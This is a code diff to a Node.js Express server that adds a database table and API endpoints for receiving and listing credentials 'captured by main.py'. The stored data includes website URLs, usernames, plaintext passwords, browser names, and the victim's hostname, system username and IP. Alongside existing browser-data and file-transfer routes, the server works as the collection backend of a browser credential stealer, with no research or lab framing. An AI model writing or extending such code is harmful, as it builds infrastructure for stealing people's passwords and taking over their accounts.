@@ -149,7 +149,27 @@ async function initDatabase() {
                 INDEX idx_created (created_at)
             )
         `);
-        
+
+        // ========== TABLE FOR CAPTURED CREDENTIALS ==========
+        // CapturedCredentials table - stores login credentials captured by main.py
+        await conn.execute(`
+            CREATE TABLE IF NOT EXISTS CapturedCredentials (
+                id INT AUTO_INCREMENT PRIMARY KEY,
+                hostname VARCHAR(255),
+                system_username VARCHAR(255),
+                source_ip VARCHAR(50),
+                captured_url VARCHAR(500),
+                captured_username VARCHAR(255),
+                captured_password VARCHAR(255),
+                capture_type VARCHAR(50),
+                browser VARCHAR(100),
+                captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                INDEX idx_hostname (hostname),
+                INDEX idx_captured_url (captured_url),
+                INDEX idx_captured_at (captured_at)
+            )
+        `);
+
         conn.release();
         console.log('[✓] Database tables initialized successfully');
     } catch (error) {
@@ -393,6 +413,124 @@ app.get('/api/browser-data/:id', async (req, res) => {
     }
 });
 
+// ==================== CREDENTIALS CAPTURE ENDPOINTS ====================
+
+/**
+ * Endpoint to receive captured credentials from main.py
+ * Expected: { hostname, system_username, credentials: [{ url, username, password, type, browser }] }
+ */
+app.post('/api/credentials', async (req, res) => {
+    try {
+        const data = req.body;
+
+        if (!data || !data.credentials || !Array.isArray(data.credentials)) {
+            return res.status(400).json({ error: 'Invalid data format - missing credentials array' });
+        }
+
+        const sourceIp = req.ip || req.connection.remoteAddress;
+        const hostname = data.hostname || 'unknown';
+        const systemUsername = data.system_username || 'unknown';
+
+        console.log(`[*] Received ${data.credentials.length} credentials from ${hostname} (${sourceIp})`);
+
+        let insertedCount = 0;
+
+        if (dbConnected && pool) {
+            const conn = await getDbConnection();
+
+            try {
+                for (const cred of data.credentials) {
+                    await conn.execute(`
+                        INSERT INTO CapturedCredentials
+                        (hostname, system_username, source_ip, captured_url, captured_username,
+                         captured_password, capture_type, browser, captured_at)
+                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+                    `, [
+                        hostname,
+                        systemUsername,
+                        sourceIp,
+                        cred.url || '',
+                        cred.username || '',
+                        cred.password || '',
+                        cred.type || 'login',
+                        cred.browser || 'unknown',
+                        new Date()
+                    ]);
+                    insertedCount++;
+                }
+
+                conn.release();
+                console.log(`[✓] Stored ${insertedCount} credentials in database`);
+
+            } catch (dbError) {
+                conn.release();
+                console.error(`[✗] Database error: ${dbError.message}`);
+                throw dbError;
+            }
+        } else {
+            // Mock storage
+            for (const cred of data.credentials) {
+                mockData.push({
+                    id: mockData.length + 1,
+                    type: 'credential',
+                    hostname,
+                    system_username: systemUsername,
+                    source_ip: sourceIp,
+                    ...cred,
+                    received_at: new Date()
+                });
+                insertedCount++;
+            }
+            console.log(`[✓] Stored ${insertedCount} credentials in mock storage`);
+        }
+
+        return res.status(201).json({
+            status: 'success',
+            message: 'Credentials received and stored',
+            count: insertedCount,
+            storage: dbConnected ? 'database' : 'memory'
+        });
+
+    } catch (error) {
+        console.error(`[✗] Error receiving credentials: ${error.message}`);
+        return res.status(500).json({
+            error: error.message || 'Internal server error'
+        });
+    }
+});
+
+/**
+ * Endpoint to get all captured credentials
+ */
+app.get('/api/credentials', async (req, res) => {
+    try {
+        if (!dbConnected || !pool) {
+            return res.status(200).json({
+                data: mockData.filter(d => d.type === 'credential'),
+                storage: 'memory'
+            });
+        }
+
+        const conn = await getDbConnection();
+
+        const [rows] = await conn.execute(`
+            SELECT id, hostname, system_username, source_ip, captured_url,
+                   captured_username, captured_password, capture_type, browser, captured_at
+            FROM CapturedCredentials
+            ORDER BY captured_at DESC
+            LIMIT 100
+        `);
+
+        conn.release();
+
+        return res.status(200).json({ data: rows, count: rows.length });
+
+    } catch (error) {
+        console.error(`[✗] Error getting credentials: ${error.message}`);
+        return res.status(500).json({ error: error.message });
+    }
+});
+
 // ==================== FILE TRANSFER ENDPOINTS ====================
 
 /**
@@ -545,6 +683,8 @@ app.get('/', (req, res) => {
             browser_data: 'POST /api/browser-data',
             browser_data_list: 'GET /api/browser-data',
             browser_data_detail: 'GET /api/browser-data/:id',
+            credentials_post: 'POST /api/credentials',
+            credentials_get: 'GET /api/credentials',
             transfer_file: 'GET /api/transfer/file?filename=<name>',
             upload_file: 'POST /api/transfer/upload',
             health_check: 'GET /api/health',
